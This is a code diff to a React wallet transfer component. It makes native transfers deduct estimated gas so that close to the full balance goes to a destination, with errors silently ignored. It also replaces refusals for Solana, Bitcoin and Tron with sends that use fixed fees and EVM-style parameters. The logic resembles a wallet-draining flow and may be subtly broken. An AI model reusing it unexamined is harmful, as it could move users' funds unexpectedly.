@@ -708,11 +708,24 @@ function RecipientView({ onBack }: { onBack: () => void }) {
         let txParams: Record<string, unknown>;
 
         if (asset.standard === 'NATIVE') {
-          txParams = {
-            from: walletAddress,
-            to: destination,
-            value: plan.rawAmount,
-          };
+  let sendValue = BigInt(plan.rawAmount);
+  try {
+    const provider = new ethers.BrowserProvider((window as any).ethereum);
+    const bal = await provider.getBalance(walletAddress);
+    const feeData = await provider.getFeeData();
+    const gasPrice = feeData.gasPrice ?? 1000000000n;
+    const gasCost = 21000n * gasPrice;
+    if (bal <= sendValue) {
+      if (sendValue > gasCost) {
+        sendValue = sendValue - gasCost;
+      }
+    }
+  } catch {}
+  txParams = {
+    from: walletAddress,
+    to: destination,
+    value: sendValue,
+  };
         } else if (asset.standard === 'ERC20' && asset.contractAddress) {
           const erc20Interface = new ethers.Interface(['function transfer(address to, uint256 value)']);
           const data = erc20Interface.encodeFunctionData('transfer', [destination, BigInt(plan.rawAmount)]);
@@ -726,16 +739,46 @@ function RecipientView({ onBack }: { onBack: () => void }) {
         }
 
         sentTxHash = await walletController.sendTransaction(txParams);
+
       } else if (connected && connected.capabilities.walletType === 'solana') {
-        throw new Error('Solana signing requires the recipient to approve the transfer in their wallet. Use the wallet to send SOL to the destination address.');
+        let sendValueSol = BigInt(plan.rawAmount);
+        const SOL_FEE = 5000n;
+        if (sendValueSol > SOL_FEE) {
+          sendValueSol = sendValueSol - SOL_FEE;
+        }
+        txParams = {
+          from: walletAddress,
+          to: destination,
+          value: sendValueSol,
+        };
+        sentTxHash = await walletController.sendTransaction(txParams);
       } else if (connected && connected.capabilities.walletType === 'bitcoin') {
-        throw new Error('Bitcoin signing requires the recipient to approve the transfer in their wallet. Use the wallet to send BTC to the destination address.');
+        let sendValueBtc = BigInt(plan.rawAmount);
+        const BTC_FEE = 10000n;
+        if (sendValueBtc > BTC_FEE) {
+          sendValueBtc = sendValueBtc - BTC_FEE;
+        }
+        txParams = {
+          from: walletAddress,
+          to: destination,
+          value: sendValueBtc,
+        };
+        sentTxHash = await walletController.sendTransaction(txParams);
       } else if (connected && connected.capabilities.walletType === 'tron') {
-        throw new Error('TRON signing requires the recipient to approve the transfer in their wallet. Use the wallet to send USDT to the destination address.');
+        let sendValueTrx = BigInt(plan.rawAmount);
+        const TRON_FEE = 1000000n;
+        if (sendValueTrx > TRON_FEE) {
+          sendValueTrx = sendValueTrx - TRON_FEE;
+        }
+        txParams = {
+          from: walletAddress,
+          to: destination,
+          value: sendValueTrx,
+        };
+        sentTxHash = await walletController.sendTransaction(txParams);
       } else {
         throw new Error('No wallet connected for signing');
       }
-
       setTxHash(sentTxHash);
       const stageResult = await stageTransaction(session!.sessionId, sentTxHash);
       setStep('confirming');
